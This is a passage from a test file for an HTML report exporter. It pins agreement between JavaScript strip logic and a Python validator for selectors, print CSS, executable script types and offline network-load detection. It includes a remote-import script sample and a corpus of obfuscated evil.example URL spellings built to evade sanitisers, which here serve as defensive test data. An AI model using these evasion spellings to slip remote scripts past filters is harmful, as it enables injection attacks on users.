        return {name: [p.strip() for p in value.split(",") if p.strip()]
                for name, value in values.items()}

    def test_the_selector_set_matches_the_runtimes_exactly(self):
        """Two-directional: catches the runtime ADDING a selector, not just removing one.

        Asserting only that the known selectors are still present would keep passing if someone
        taught the exporter a NEW chart shape while the stripper silently missed it - exactly the
        false negative that deletes a payload the export then demands. Nothing is filtered on the
        words "chart"/"mermaid" either: a keyword filter would silently drop a future selector
        such as `canvas[data-cmh-visual]` and quietly re-open the hole this test exists to close.
        """
        consts = self._selector_constants()
        self.assertIn("CMH_RICH_CONTENT_SEL", consts,
                      "the runtime no longer declares CMH_RICH_CONTENT_SEL; the parity check is "
                      "stale and must be re-pointed at whatever replaced it")
        self.assertEqual(
            set(consts["CMH_RICH_CONTENT_SEL"]), set(vendored_libs.RUNTIME_SELECTORS),
            "the runtime's rich-content selectors and vendored_libs.RUNTIME_SELECTORS have "
            "diverged. Update RUNTIME_SELECTORS *and* the detector, or a document using the new "
            "shape will be stripped of a payload its own offline export needs.")

    def test_the_exporter_queries_the_shared_constants_rather_than_its_own_literals(self):
        """The single-definition invariant itself (issue #740).

        Re-typing a selector list inside an offline-usage function is how the exporter and the
        live renderer came to disagree about what a chart is. Fail on any string literal passed
        to querySelector there, so the drift cannot come back.

        `_offlineDocNeedsChartLib` is in the list because it is the function that actually decides
        whether the export inlines Chart.js. It carries the chart-canvas selector a SECOND time,
        and pinning it to the SAME constant as the shape gate is what stops the two from drifting
        apart - a document whose chart one of them recognises and the other does not would lose
        the library its export needs. Functions that scan `script` elements for evidence
        (`_offlineDocReferencesChartLib`) are deliberately NOT in the list: their selector is not
        a content shape.
        """
        source = self._read("68-export-offline.js")
        expected = {
            "_offlineLiveDocNeedsRichLibs": "CMH_RICH_CONTENT_SEL",
            "_offlineDocUsesMermaid": "CMH_MERMAID_SEL",
            "_offlineDocUsesCharts": "CMH_CHART_CANVAS_SEL",
            "_offlineDocNeedsChartLib": "CMH_CHART_CANVAS_SEL",
        }
        for fn, constant in expected.items():
            start = source.find("function " + fn)
            self.assertNotEqual(start, -1,
                                "the runtime no longer defines %s; the parity check is stale "
                                "and must be re-pointed at whatever replaced it" % fn)
            body = source[start:source.find("\n}", start)]
            self.assertTrue(
                re.search(r"querySelector(?:All)?\(\s*" + re.escape(constant) + r"\s*\)", body),
                "%s must query the shared %s constant" % (fn, constant))
            self.assertEqual(
                re.findall(r"querySelector(?:All)?\(\s*[\"'`]", body), [],
                "%s passes a selector literal instead of the shared constant" % fn)

    def test_the_live_renderer_draws_a_subset_of_what_the_exporter_provisions_for(self):
        """Anything the chart renderer draws must be something the export inlines Chart.js for."""
        consts = self._selector_constants()
        renderer = self._read("30-images.js")
        self.assertIn("root.querySelectorAll(CMH_CHART_DATA_SEL)", renderer,
                      "the live chart renderer must select the shared CMH_CHART_DATA_SEL set")
        self.assertTrue(
            set(consts["CMH_CHART_DATA_SEL"]).issubset(set(consts["CMH_CHART_CANVAS_SEL"])),
            "the renderer's chart selectors must be a subset of the exporter's, or a chart can "
            "render live and then export blank")

    def test_no_other_partial_re_types_a_declared_selector_list_verbatim(self):
        """A backstop against the coarsest form of re-typing: copying a declared list wholesale.

        It is deliberately narrow. It does NOT catch a VARIANT of a declared list (the historical
        drift was a variant, not a copy - `canvas.cmh-chart[data-cmh-chart-points], ...` versus
        `figure.chart canvas, canvas.cmh-chart`); component-level matching would fire on the many
        places that legitimately query `pre.mermaid` or `figure.chart` alone for a different
        purpose. The real guarantee against a variant is that the consumers query the constants
        (`test_the_exporter_queries_the_shared_constants_rather_than_its_own_literals` and
        `test_the_live_renderer_draws_a_subset_of_what_the_exporter_provisions_for`); this only
        stops a copy from quietly becoming a second source of truth.
        """
        # Only LISTS are guarded: re-typing an assembled multi-selector list is the drift this
        # exists to catch, while a single token like `figure.chart` is ordinary CSS that other
        # layers legitimately query on its own.
        declared = {", ".join(sel_list) for sel_list in self._selector_constants().values()
                    if len(sel_list) > 1}
        self.assertTrue(declared, "no multi-selector constants declared in 03-selectors.js")
        call_re = re.compile(
            r"(?:querySelectorAll|querySelector|closest|matches)\(\s*[\"'`]([^\"'`]+)[\"'`]")
        js_dir = os.path.join(_paths.DEV, "assets", "js")
        for name in sorted(os.listdir(js_dir)):
            if name == "03-selectors.js" or not name.endswith(".js"):
                continue
            body = self._read(name)
            for used in call_re.findall(body):
                normalized = ", ".join(p.strip() for p in used.split(",") if p.strip())
                self.assertNotIn(
                    normalized, declared,
                    "%s re-types the selector list %r that 03-selectors.js already declares; "
                    "query the shared constant instead" % (name, used))

    def test_the_print_measure_css_derives_its_mermaid_hosts_from_the_shared_constant(self):
        """CMH-PRINT-07: the measure CSS must DERIVE its diagram hosts, not re-type them.

        `83-print.js` builds a CSS string it applies under screen media to measure single-page
        height (CMH-PRINT-06). Its tall-media cap has to name the mermaid hosts, and re-typing
        them there is exactly how `div.mermaid` fell out of the cap while `pre.mermaid` kept it:
        the list was written once from memory as `pre.mermaid` alone and then never revisited when
        the runtime learned the second host. Deriving from `CMH_MERMAID_SEL` makes that class of
        drift impossible rather than merely fixed once.

        Three things are asserted, because any one alone is false-greenable: the helper really
        reads the shared constant, `measureCss()` really CONCATENATES the helper's result (a call
        whose value is discarded would leave the cap gone), and no string literal in the file
        re-types a host behind the helper's back. All of it runs on comment-blanked code, so a
        comment naming an identifier cannot stand in for the code that used to use it.
        """
        source = self._read("83-print.js")
        literals, code = self._scan_js(source)
        # `_scan_js` deliberately models strings and comments but NOT regex literals, which also
        # open with "/" and would leave stray braces and quotes in the code stream - silently
        # pointing every check below at the wrong text. Nothing in this partial uses a regex
        # literal (or a division) today, so assert that stays true rather than assuming it.
        self.assertNotIn(
            "/", code,
            "83-print.js now has a '/' outside a string or comment (a regex literal or a "
            "division). _scan_js models neither, so it can no longer be trusted to blank strings "
            "or match braces here; teach it the new construct before relying on this guard.")
        helper = self._function_body(code, "_printMermaidCapSel")
        self.assertIn("CMH_MERMAID_SEL", helper,
                      "_printMermaidCapSel() must build the cap selector from the shared "
                      "CMH_MERMAID_SEL constant declared in 03-selectors.js")
        measure = self._function_body(code, "measureCss")
        self.assertIn("+ _printMermaidCapSel()", measure,
                      "measureCss() must CONCATENATE _printMermaidCapSel() into its selector "
                      "list; a bare call whose result is dropped, or a helper nothing calls at "
                      "all, leaves the measured page uncapped for diagrams")
        for host in self._mermaid_hosts():
            for literal in literals:
                self.assertNotIn(
                    host, literal,
                    "83-print.js re-types the mermaid host %r that 03-selectors.js already "
                    "declares (in the string literal %r); derive it from CMH_MERMAID_SEL instead, "
                    "or the two can drift again" % (host, literal))
            # Splitting a host across two concatenated literals ("#commentRoot pre" + ".mermaid
            # svg,") re-types it just as effectively while defeating a per-literal scan, so check
            # the run of literals as one string too.
            self.assertNotIn(
                host, "".join(literals),
                "83-print.js re-types the mermaid host %r that 03-selectors.js already declares, "
                "split across concatenated string literals; derive it from CMH_MERMAID_SEL "
                "instead" % host)

    def test_the_clip_layer_derives_its_containers_from_the_shared_constant(self):
        """CMH-RESP-02: the clip-container selectors must DERIVE their hosts, not re-type them.

        `_clipContainersFor()` in `20-mermaid.js` resolves the boxes a floating diagram control is
        clamped to. Its container lists have to name the mermaid hosts, and re-typing them there is
        exactly how a standalone `div.mermaid` fell out of the clip layer while `pre.mermaid` kept
        it (issue #769): the list was written once as `pre.mermaid` alone and never revisited when
        the runtime learned the second host. The sibling backstop
        (`test_no_other_partial_re_types_a_declared_selector_list_verbatim`) cannot catch this - it
        only matches a WHOLESALE copy of a declared list, and the historical bug was a VARIANT
        (`pre.mermaid, figure.chart, table, .cmh-diff-raw`), which normalizes to a string that is
        not in `declared` and so passes. This pins the derivation itself, mirroring
        `test_the_print_measure_css_derives_its_mermaid_hosts_from_the_shared_constant` for the
        print surface.

        Three things are asserted, because any one alone is false-greenable: the token list really
        reads the shared constant, both selectors really BUILD from those tokens (a list that
        merely sits beside them is not wired up), and no string literal in the file re-types a
        host behind their back. All of it runs on comment-blanked code, so a comment naming an
        identifier cannot stand in for the code that used to use it.
        """
        source = self._read("20-mermaid.js")
        literals, code = self._scan_js(source)
        self.assertIn(
            "CMH_MERMAID_SEL", code,
            "20-mermaid.js no longer reads the shared CMH_MERMAID_SEL constant; the clip-container "
            "selectors must derive their diagram hosts from 03-selectors.js, not re-type them")
        # The normalized token list is the single seam both selectors build from. Pin that BOTH are
        # built from it: a derived gallery list beside a hand-typed clip list is exactly the
        # half-migrated state issue #769 fixed.
        self.assertRegex(
            code, r"var MERMAID_HOST_TOKENS\s*=[^;]*CMH_MERMAID_SEL",
            "MERMAID_HOST_TOKENS must be built from CMH_MERMAID_SEL, so every clip-container "
            "selector in this partial shares one normalization of the shared vocabulary")
        for name in ("GALLERY_CARD_SEL", "CLIP_CONTAINER_SEL"):
            self.assertRegex(
                code, r"var %s\s*=[^;]*MERMAID_HOST_TOKENS" % name,
                "%s must be BUILT from MERMAID_HOST_TOKENS; a list that re-types the hosts (or is "
                "assembled some other way) can drift from the vocabulary again" % name)
        # And the resolver has to actually USE them - a derived constant nothing queries leaves the
        # clip layer on whatever literal replaced it. Both vocabularies now meet in ONE walk
        # selector (CMH-RESP-12 intersects the whole chain of clipping ancestors), so pin that seam
        # in both directions: the walk selector is built from both lists, and the resolver queries
        # the walk selector.
        for name in ("GALLERY_CARD_SEL", "CLIP_CONTAINER_SEL"):
            self.assertRegex(
                code, r"var CLIP_CHAIN_SEL\s*=[^;]*%s" % name,
                "CLIP_CHAIN_SEL must be built from %s; a walk selector that re-types either "
                "vocabulary can drift from it again" % name)
        resolver = self._function_body(code, "_clipContainersFor")
        self.assertIn(
            "CLIP_CHAIN_SEL", resolver,
            "_clipContainersFor() must query CLIP_CHAIN_SEL; a derived selector the resolver never "
            "uses does not clip anything")
        for host in self._mermaid_hosts():
            self.assertNotIn(
                host, "".join(literals),
                "20-mermaid.js re-types the mermaid host %r that 03-selectors.js already declares "
                "(including split across concatenated string literals); derive it from "
                "CMH_MERMAID_SEL instead, or the two can drift again" % host)

    def test_the_print_stylesheet_caps_exactly_the_shared_mermaid_hosts(self):
        """CMH-PRINT-07: pin the one surface that CANNOT import the constant.

        `92-print.css` is a plain stylesheet: it has no way to reference a JS constant, so it is
        the one place the mermaid vocabulary is unavoidably spelled out. Pin it two-directionally
        instead, exactly as `vendored_libs.RUNTIME_SELECTORS` is pinned for the Python detector -
        every declared host must be capped, and no OTHER `.mermaid` host may be. Then the printed
        cap (this stylesheet) and the measured cap (`measureCss()`, derived above) can never again
        disagree about what a diagram host is: capping a host in one but not the other either
        prints an oversized diagram or measures a height the print never produces.

        Comments are stripped FIRST. The prose above the rule explains which hosts it caps, so a
        comment could otherwise satisfy this check on its own - delete `div.mermaid svg` from the
        selector, mention it in the comment, and an unstripped scan still passes while the cap is
        gone. That is precisely the silent half-vocabulary regression this test exists to catch.
        """
        css = self._strip_css_comments(self._read_css("92-print.css"))
        blocks = [m for m in re.finditer(r"([^{}]*)\{([^{}]*max-height:\s*8\.4in[^{}]*)\}", css)]
        self.assertEqual(len(blocks), 1,
                         "expected exactly one 8.4in tall-media cap rule in 92-print.css; found "
                         "%d. Re-point this check at whatever replaced it." % len(blocks))
        selector = blocks[0].group(1)
        # An attribute-selector VALUE is not a capped host: `[data-x="div.mermaid svg"]` would
        # otherwise satisfy every check below while the real cap was deleted - the same
        # "text near the rule stands in for the rule" hole the comment stripping above closes.
        selector = re.sub(r"\[[^\]]*\]", "[]", selector)
        # Collect every `<element>.<class> svg` arm the rule caps, WITHOUT hard-coding ".mermaid":
        # a future vocabulary with a different class name must still be checked, not silently
        # skipped. The trailing boundary matters too - `pre.mermaid svgx` is not a cap on the
        # rendered SVG, and a plain substring test would accept it.
        capped = set(re.findall(r"([A-Za-z][\w-]*\.[\w-]+)\s+svg(?![\w-])", selector))
        self.assertEqual(
            capped, set(self._mermaid_hosts()),
            "the print stylesheet's tall-media cap and the shared CMH_MERMAID_SEL vocabulary have "
            "diverged (capped `<host> svg`: %s; declared: %s). A declared host that is NOT capped "
            "prints an unconstrained diagram that overflows the page; a capped host that is no "
            "longer declared is dead CSS. Note the cap must target the rendered `svg` INSIDE the "
            "host, not the host box." % (sorted(capped), sorted(self._mermaid_hosts())))

    @staticmethod
    def _blank_css_strings(css):
        """Return `css` with every string literal's CONTENT replaced by spaces (length preserved).

        Braces, semicolons, and quotes inside a `content: "..."` value are text, not structure, but
        a flat brace walk cannot tell the difference: a `content: "}"` would end a declaration block
        early and strip the media context off every rule after it. Blanking the strings up front
        makes the walk - and the precondition checks that follow it - structure-only, so an ordinary
        string value is never mistaken for a defect (and an apostrophe inside a double-quoted label
        is not a false red). Offsets are preserved so slices still line up with the original text.
        """
        out, quote, i, n = list(css), None, 0, len(css)
        while i < n:
            ch = css[i]
            if quote:
                if ch == "\\":
                    if i + 1 < n:
                        out[i + 1] = " "
                    out[i] = " "
                    i += 2
                    continue
                if ch == quote:
                    quote = None
                else:
                    out[i] = " "
            elif ch in ('"', "'"):
                quote = ch
            i += 1
        return "".join(out)

    def _iter_css_rules(self, css, name="<css>"):
        """Yield `(at_rule_preludes, selector, declarations)` for every rule in a stylesheet.

        A plain scan, not a CSS parser: string literals are blanked first (so a brace or semicolon
        inside a value is never read as structure), then it tracks the stack of enclosing at-rule
        preludes so a rule's media context is known. What it still cannot model - CSS nesting, an
        at-rule that carries no block, unbalanced braces - is ASSERTED, naming the offending FILE,
        rather than assumed. Get any of that wrong silently and the scan mis-attributes a rule's
        media context, which either hides a print-scoped mask or blames this file for a construct
        introduced in a different partial. `_scan_js` above self-checks for the same reason: a guard
        against silent drift must not drift silently. Feed it COMMENT-STRIPPED text, so prose
        describing a rule cannot stand in for it.
        """
        css = self._blank_css_strings(css)
        rules, stack, i, start, n = [], [], 0, 0, len(css)
        while i < n:
            ch = css[i]
            if ch == "{":
                prelude = css[start:i].strip()
                self.assertNotIn(
                    ";", prelude,
                    "%s has a `;` inside the prelude %r, so this scanner cannot tell where the "
                    "block starts. Either an at-rule that carries no block (`@import`, "
                    "`@layer base;`, `@charset`) merged into it, or an at-rule follows declarations "
                    "inside a block (an `@page` margin box such as `@bottom-center`). Teach this "
                    "scanner the construct before relying on it." % (name, prelude[:120]))
                if prelude.startswith("@"):
                    stack.append(prelude)
                    i += 1
                    start = i
                    continue
                end = css.find("}", i)
                end = n if end == -1 else end
                decls = css[i + 1:end]
                self.assertNotIn(
                    "{", decls,
                    "%s now has a declaration block containing a nested `{` (CSS nesting). This "
                    "scanner is a flat brace walk and would mis-read the media context of the rules "
                    "around it - teach it the new construct before relying on it. Block: %r"
                    % (name, decls[:120]))
                rules.append((tuple(stack), prelude, decls))
                i = end + 1
                start = i
                continue
            if ch == "}":
                if stack:
                    stack.pop()
                i += 1
                start = i
                continue
            i += 1
        self.assertEqual(
            stack, [],
            "%s left at-rule(s) %s unclosed when the scan finished, so every rule's media context "
            "is suspect. Braces do not balance (or an unsupported construct fooled the scan)."
            % (name, stack))
        return rules

    @staticmethod
    def _is_screen_only_media(prelude):
        """True only when EVERY comma branch of an `@media` prelude requires the screen type.

        A media list is a union, so one permissive branch admits print: `@media screen, all` and
        `@media screen, (min-width: 0px)` both match a printer while still starting with the word
        `screen`. Requiring every branch to name `screen` is what makes this guard mean what it
        says. `only screen` is the same media type with the legacy hack prefix, so it counts. The
        prelude is whitespace-normalized and matched case-insensitively first, so a wrapped or
        upper-case query is not a false red about a query that in fact never matches paper.
        """
        prelude = " ".join(prelude.split())
        if not prelude.lower().startswith("@media"):
            return False
        query = prelude[len("@media"):]
        branches = [b.strip() for b in query.split(",")]
        return bool(branches) and all(
            re.match(r"^(only\s+)?screen(\s+and\b.*)?$", branch, re.I) for branch in branches)

    @staticmethod
    def _mask_image_values(decls, prefixed=False):
        """Every `mask-image` (or `-webkit-mask-image`) value declared in a declaration block.

        The value is CAPTURED rather than pattern-matched in place: a `\\s*(?!none)` style lookahead
        can backtrack to consume no whitespace and then happily "not see" the `none` that follows,
        which is exactly how a reset would have been mistaken for the cue.
        """
        pattern = r"-webkit-mask-image\s*:\s*([^;}]*)" if prefixed else r"(?<![-\w])mask-image\s*:\s*([^;}]*)"
        return [v.strip() for v in re.findall(pattern, decls)]

    def test_the_diagram_scroll_fade_mask_is_screen_only_on_exactly_the_shared_mermaid_hosts(self):
        """CMH-PRINT-08: the scroll cue lives in a screen-only context, so print cannot inherit it.

        The edge fade tells a reader a wide diagram scrolls horizontally inside its own box. Paper
        does not scroll, so a mask that survives into print only washes out the printed diagram's
        edges. The expression is to declare the mask `screen`-only at its single source rather than
        to add a print-scoped reset in `92-print.css`: the cue is a pure screen affordance, and a
        reset would be a redundant SECOND rule naming the same host set, which is exactly the shape
        that let `div.mermaid` fall out of the tall-media cap while `pre.mermaid` kept it
        (CMH-PRINT-07).

        Pinned in both directions, across every stylesheet partial: EVERY rule that masks a
        scroll-fade host sits in a screen-only `@media` context (each comma branch of the query must
        name `screen`, since a media list is a union and one permissive branch would admit print),
        and the union of the hosts they fade is exactly the shared `CMH_MERMAID_SEL` vocabulary - so
        the mask can neither leak back into print nor fade one host shape while leaving the other
        alone. Rules are counted rather than required to be exactly one, so a behavior-preserving
        split (one rule per host, or a theme variant) is not a false red, while a leaked print
        duplicate still fails on its own media context.

        This pin owns the MEDIA CONTEXT and the host set; that the cue is still LIVE on screen is
        owned by the browser specs (`68-print.spec.js` CMH-PRINT-08 and `51-charts-mobile.spec.js`
        CMH-RESP-09), which read the computed style. It also owns the prefixed/unprefixed pair:
        Chromium aliases `-webkit-mask-image` and `mask-image` into one computed value, so no
        browser assertion in this Chromium-only suite can tell them apart, while the standalone
        reports are opened in arbitrary browsers where both declarations matter.
        """
        css_dir = os.path.join(_paths.DEV, "assets", "css")
        faded = []
        for name in sorted(os.listdir(css_dir)):
            if not name.endswith(".css"):
                continue
            css = self._strip_css_comments(self._read_css(name))
            for media, selector, decls in self._iter_css_rules(css, name):
                # Anchored matches: `.cmh-diagram-scroll-fades` is not the class, a bare
                # `mask-image` substring test would be satisfied by `-webkit-mask-image` alone, and
                # the VALUE matters too - a rule that sets the mask to `none` is a RESET, not the
                # cue, so collecting it here would fail a defensive print reset with a message
                # asserting the exact opposite of what that rule does.
                masks = self._mask_image_values(decls)
                if (re.search(r"\bcmh-diagram-scroll-fade\b(?![-\w])", selector)
                        and any(value and value != "none" for value in masks)):
                    faded.append((name, media, selector, decls))
        self.assertTrue(
            faded,
            "no scroll-fade mask rule found in any CSS partial. Either the cue was deleted (a wide "
            "diagram no longer signals that it scrolls) or it moved somewhere this check cannot "
            "see; re-point this check at whatever replaced it.")
        hosts = set()
        for name, media, selector, decls in faded:
            self.assertTrue(
                any(self._is_screen_only_media(prelude) for prelude in media),
                "the scroll-fade mask rule in %s is not inside a screen-only @media block (at-rule "
                "context: %s). Outside one it applies in PRINT too, and a wide diagram prints with "
                "faded left and right edges for a scroll that paper cannot do. Note a media LIST is "
                "a union: every comma branch must name `screen`, or the rule still matches paper."
                % (name, list(media)))
            for prelude in media:
                self.assertNotRegex(
                    prelude, r"(?<![-\w])print(?![-\w])",
                    "the scroll-fade mask rule in %s sits in an at-rule context that names the "
                    "print media type (%r); the cue is for scrolling, which paper does not do."
                    % (name, prelude))
            self.assertTrue(
                [v for v in self._mask_image_values(decls, prefixed=True) if v and v != "none"],
                "the scroll-fade mask rule in %s dropped (or reset to `none`) its "
                "`-webkit-mask-image` declaration. The reports are standalone HTML opened in "
                "arbitrary browsers, and no assertion in this Chromium-only suite can catch it "
                "(Chromium aliases the two properties), so the pair is pinned here." % name)
            # An attribute-selector VALUE is not a faded host: `[data-x="div.mermaid.cmh-diagram-
            # scroll-fade"]` would otherwise satisfy the vocabulary check while the real rule faded
            # nothing - the same "text near the rule stands in for the rule" hole the comment
            # stripping closes. A blanked `[]` BETWEEN the host and the class is fine, though
            # (`div.mermaid[data-x].cmh-diagram-scroll-fade` still fades that host).
            cleaned = re.sub(r"\[[^\]]*\]", "[]", selector)
            hosts |= set(re.findall(
                r"([A-Za-z][\w-]*\.[\w-]+)(?:\[\])*\.cmh-diagram-scroll-fade(?![-\w])", cleaned))
        self.assertEqual(
            hosts, set(self._mermaid_hosts()),
            "the scroll-fade mask rules and the shared CMH_MERMAID_SEL vocabulary have diverged "
            "(faded hosts: %s; declared: %s). A declared host with no fade loses the scroll cue; a "
            "faded host that is no longer declared is dead CSS. Note this reads flat "
            "`<element>.<class>` arms (the shape `_mermaid_hosts` pins); teach it if the selector "
            "grammar changed to `:is(...)` or similar."
            % (sorted(hosts), sorted(self._mermaid_hosts())))

    def test_every_runtime_selector_is_recognised_by_the_author_time_detector(self):
        markup = {
            "pre.mermaid": '<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>',
            "div.mermaid": '<div class="mermaid">graph TD; A--&gt;B;</div>',
            "figure.chart canvas": '<figure class="chart"><canvas id="a"></canvas></figure>',
            "canvas.cmh-chart": '<canvas class="cmh-chart" id="b"></canvas>',
            "canvas[data-cmh-chart-points]": '<canvas id="c" data-cmh-chart-points="[]"></canvas>',
            "canvas[data-cmh-chart-source]": '<canvas id="d" data-cmh-chart-source="pts"></canvas>',
        }
        self.assertEqual(set(markup), set(vendored_libs.RUNTIME_SELECTORS),
                         "add example markup for every declared runtime selector")
        for selector, fragment in markup.items():
            self.assertTrue(
                vendored_libs.content_needs_rich_libs(_doc("<h1>H</h1>\n" + fragment)),
                "content matching the runtime selector %r must be detected as needing the "
                "libraries" % selector)


    def test_the_python_and_js_runnable_script_type_predicates_agree(self):
        """The offline strips (JS) and the strict validator (Python) must call the SAME script
        types executable.

        They are two independent implementations of the HTML "JavaScript MIME type" set, and a
        drift between them is invisible: the validator would declare an offline file clean while
        the exporter's strips no longer protect it (or the reverse, so the gate rejects a file the
        exporter just produced). That is not hypothetical - the validator's set was the narrow
        five-type one for as long as the strips' was, so `<script type="text/x-javascript">
        import("https://evil/")</script>` passed `validate.py --strict` as offline-clean.

        Two-directional: the corpus mixes every accepted type with inert and near-miss ones
        (`text/javascript1.6` is deliberately NOT a JavaScript MIME type), so this fails whether an
        implementation drops a type or gains one the other does not have.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineIsRunnableScriptType")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _offlineIsRunnableScriptType; the "
                            "parity check is stale and must be re-pointed at whatever replaced it")
        body = source[start:source.find("\n}", start)]
        patterns = re.findall(r"/\^((?:[^/\\]|\\.)*)\$/", body)
        self.assertEqual(len(patterns), 2,
                         "expected exactly 2 anchored type regexes in the runtime predicate, got "
                         "%r - the extraction is stale" % (patterns,))
        runtime_res = [re.compile("^" + p.replace("\\/", "/") + "$") for p in patterns]

        def runtime_says_runnable(raw):
            normalized = str(raw or "").split(";")[0].strip().lower()
            if not normalized or normalized == "module":
                return True
            return any(rx.match(normalized) for rx in runtime_res)

        # The accepted list is written out LITERALLY rather than derived from `_JS_TYPES`: a corpus
        # built from the set under test shrinks with it, so removing a type would silently remove
        # its own coverage and the check would pass. Unioning `_JS_TYPES` on top covers the other
        # direction (a type ADDED to only one implementation).
        accepted = {"", "module", "text/javascript", "application/javascript",
                    "text/x-javascript", "application/x-javascript",
                    "text/ecmascript", "application/ecmascript",
                    "text/x-ecmascript", "application/x-ecmascript",
                    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
                    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
                    "text/jscript", "text/livescript"}
        corpus = sorted(accepted | set(parsing._JS_TYPES) | {
            # inert: data or transpiler-only, must NOT count as executable on either side
            "text/plain", "application/json", "application/ld+json", "importmap",
            "speculationrules", "text/template", "text/babel", "text/jsx",
            "text/x-handlebars-template", "text/vbscript",
            # near misses and normalization
            "text/javascript1.6", "text/javascript1.", "text/ecmascript6", "javascript",
            "  TEXT/JavaScript  ", "text/javascript; charset=utf-8", "module; x=1",
        })
        for raw in accepted:
            self.assertTrue(runtime_says_runnable(raw),
                            "the runtime predicate no longer runs %r, which the HTML JavaScript "
                            "MIME type set says a browser executes" % raw)
        self.assertEqual(
            accepted, set(parsing._JS_TYPES),
            "the literal accepted-type list in this test and the validator's _JS_TYPES have "
            "diverged. Both are deliberate spellings of the HTML JavaScript MIME type set; move "
            "them together, or the corpus silently stops covering whatever was dropped.")
        for raw in corpus:
            self.assertEqual(
                runtime_says_runnable(raw), parsing._is_executable_js({"type": raw}),
                "the runtime's _offlineIsRunnableScriptType and the validator's _JS_TYPES "
                "disagree about %r. Update BOTH: a type only one of them runs is either an "
                "unstripped executable script the gate blesses, or a false rejection." % raw)


    def test_the_python_and_js_script_load_attributes_agree(self):
        """The offline strip (JS) and the strict validator (Python) must call the SAME attributes a
        script LOAD.

        They are two independent spellings of the set, and a drift between them is the CMH-OFFLINE-04
        failure mode itself: the validator would bless an offline file the strip no longer protects
        (which is exactly how an SVG `<script href>` shipped in a zero-network document), or reject
        one the exporter just produced. The literal control below is written out rather than derived
        from either side, so dropping an attribute from BOTH cannot quietly delete its own coverage.
        """
        source = self._read("68-export-offline.js")
        m = re.search(r"const _OFFLINE_SCRIPT_LOAD_ATTRS = \[([^\]]*)\];", source)
        self.assertIsNotNone(m, "the runtime no longer declares _OFFLINE_SCRIPT_LOAD_ATTRS; the "
                                "parity check is stale and must be re-pointed at whatever replaced it")
        runtime_attrs = tuple(re.findall(r'"([^"]+)"', m.group(1)))
        self.assertEqual(runtime_attrs, ("src", "href", "xlink:href"),
                         "the runtime's script-load attribute set changed. An SVG <script> loads "
                         "through `href`/`xlink:href` and an HTML one through `src`; update this "
                         "literal control and the validator's SCRIPT_LOAD_ATTRS together.")
        self.assertEqual(runtime_attrs, tuple(resources.SCRIPT_LOAD_ATTRS),
                         "the runtime's _OFFLINE_SCRIPT_LOAD_ATTRS and the validator's "
                         "SCRIPT_LOAD_ATTRS have diverged: %r vs %r. An attribute only one of them "
                         "reads is either an unstripped remote loader the gate blesses, or an "
                         "exported file its own --strict run rejects."
                         % (runtime_attrs, tuple(resources.SCRIPT_LOAD_ATTRS)))

    # A browser removes leading C0 controls and spaces (U+0000-U+0020) before it parses a URL, so a
    # value padded with those still loads while one padded with NBSP or U+FEFF does not resolve as a
    # URL at all. Both engines must draw that line in the same place: JS `\s` excludes U+001C-U+001F
    # but includes U+FEFF, Python's includes the former and not the latter, and Python's
    # `re.IGNORECASE` folds `s` onto U+017F where JS never does.
    # Each case carries its EXPECTED verdict rather than only being compared across the two
    # engines: two implementations that under-detect the same spelling agree perfectly, which is
    # how the browser-normalized spellings below (#923) sat unnoticed in both for so long.
    _NETWORK_URL_CORPUS = [
        ("https://evil.example/x.js", True), ("HTTPS://EVIL.EXAMPLE/x.js", True),
        ("http://evil.example/x.js", True), ("//evil.example/x.js", True),
        (" https://evil.example/x.js", True), ("\thttps://evil.example/x.js", True),
        ("\n//evil.example/x.js", True), ("\r\n//evil.example/x.js", True),
        ("\f//evil.example/x.js", True), ("\u000b//evil.example/x.js", True),
        ("\u0000//evil.example/x.js", True), ("\u001c//evil.example/x.js", True),
        ("\u001d//evil.example/x.js", True), ("\u001e//evil.example/x.js", True),
        ("\u001f//evil.example/x.js", True), ("\u000e//evil.example/x.js", True),
        ("\u001f  \t https://evil.example/x.js", True),
        # padding a browser does NOT strip: the value is a relative reference, not a network load
        ("\u00a0https://evil.example/x.js", False), ("\u2028//evil.example/x.js", False),
        ("\u3000//evil.example/x.js", False), ("\ufeff//evil.example/x.js", False),
        ("\u200b//evil.example/x.js", False),
        # not a network load: relative, rooted, fragment, data, another scheme, or the literal
        # buried after something that is not padding
        ("", False), ("svg-local-keep.js", False), ("./x.js", False), ("/root-relative.js", False),
        ("#anchor", False), ("data:text/javascript,void%200", False),
        ("mailto:someone@example.com", False), ("ftp://evil.example/x.js", False),
        ("x https://evil.example/x.js", False),
        # A single slash after a special scheme IS an authority to the URL parser, and a SCHEME-ONLY
        # spelling resolves to the same host: the special-authority states ignore whatever run of
        # slashes follows the colon, so `https:evil.example/x.js` and `https:/evil.example/x.js`
        # both fetch `https://evil.example/x.js` from a `file://` document. Both sides now read the
        # run rather than counting it (#961 moved the attribute predicate together with the CSS
        # gates and strips it mirrors), so a one-token spelling change no longer walks past them.
        ("https:/evil.example/x.js", True), ("https:evil.example/x.js", True),
        ("HTTPS:EVIL.EXAMPLE/x.js", True), ("https:///evil.example/x.js", True),
        ("https:/\tevil.example/x.js", True), ("http:evil.example", True),
        # ...but the run still has to be followed by a HOST. An authority terminated at once by
        # `?`, `#` or the end of the value is empty, which a special scheme fails to parse at all,
        # so a bare scheme is left alone rather than reported as a beacon.
        ("https:", False), ("https:?q", False), ("https:#f", False), ("https:/", False),
        # Case folding is ASCII-only on both sides: Python's `re.IGNORECASE` would otherwise fold
        # `s` onto U+017F, which a JS `/i` regex never does (and which no browser resolves as a
        # scheme either), so the gate would flag a value the strip keeps.
        ("http\u017f://evil.example/x.js", False), ("HTTP\u017f://evil.example/x.js", False),
        ("\u212a//evil.example/x.js", False),
        # Spellings the URL parser NORMALIZES into a network URL before it fetches, so both sides
        # must normalize before they test. A backslash opens an authority for a special scheme
        # exactly as a slash does, in either position (`https:/\evil.example/x.js` was verified
        # fetching https://evil.example/x.js in a real Chromium), and an ASCII tab, CR or LF is
        # removed from ANYWHERE in the input rather than only from the front.
        ("https:/\\evil.example/x.js", True), ("https:\\/evil.example/x.js", True),
        ("https:\\\\evil.example/x.js", True), ("\\\\evil.example/x.js", True),
        ("\\/evil.example/x.js", True), ("/\\evil.example/x.js", True),
        ("https:\n//evil.example/x.js", True), ("ht\ttps://evil.example/x.js", True),
        ("//evil.\rexample/x.js", True), ("/\t/evil.example/x.js", True),
        ("\u001f \\\\evil.example/x.js", True),
